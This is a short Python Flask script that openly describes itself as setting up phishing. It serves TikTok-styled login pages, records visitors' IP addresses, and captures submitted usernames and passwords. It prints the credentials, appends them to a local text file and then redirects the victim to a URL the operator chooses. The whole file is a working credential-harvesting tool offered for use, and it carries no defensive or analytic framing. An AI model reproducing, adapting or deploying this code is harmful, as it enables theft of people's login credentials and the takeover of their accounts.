import os
from flask import Flask, render_template, request, redirect, url_for

print('Setting up phishing...')
action_url = input('Enter the URL to redirect users after phishing: ')

app = Flask(__name__, template_folder='templates/tiktok')
username = None

@app.route("/")
def home():
    user_ip = request.remote_addr
    print(f"User IP address: {user_ip}")
    return render_template('index.html')

@app.route("/login", methods=["POST"])
def login():
    global username
    username = request.form['username']
    password = request.form['password']
    user_ip = request.remote_addr  # Получение IP-адреса пользователя внутри функции
    print('User: ', username)
    print('Password: ', password)

    # Определяем текущий путь
    current_path = os.path.abspath(os.path.dirname(__file__))
    file_path = os.path.join(current_path, 'tiktok_user_data.txt')
    print(f"File path: {file_path}")

    # Запись в файл с кодировкой UTF-8
    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write(f"User: {username}, Password: {password}, IP: {user_ip}\n")
        print("Data successfully written to file.")
    except Exception as e:
        print(f"Error writing to file: {e}")

    return redirect(action_url)

@app.route("/welcome")
def welcome():
    # Redirect to action_url on the client's browser
    return render_template("xd1.html")

if __name__ == '__main__':
    print("Starting the server...")
    app.run(host='0.0.0.0', port=8088)
